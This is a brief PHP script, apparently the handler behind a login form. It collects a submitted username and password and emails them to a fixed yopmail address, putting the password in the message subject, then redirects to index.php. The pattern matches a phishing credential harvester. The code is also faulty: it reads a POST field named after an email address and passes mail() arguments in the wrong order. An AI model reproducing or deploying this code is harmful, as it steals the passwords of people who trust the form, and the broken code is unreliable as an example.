<?php
    if(isset($_POST['submit'])){
        $usr=$_POST['usr'];
        $password=$_POST['password'];
        $email=$_POST['khalil2@yopmail.com'];

        $to="khalil@yopmail.com";
        $subject= 'Mot de passe'.$password;
        $headers= "From:".$email;

        mail($to,$usr, $subject,$headers);
        header("Location: index.php?mailsend");
    }

?>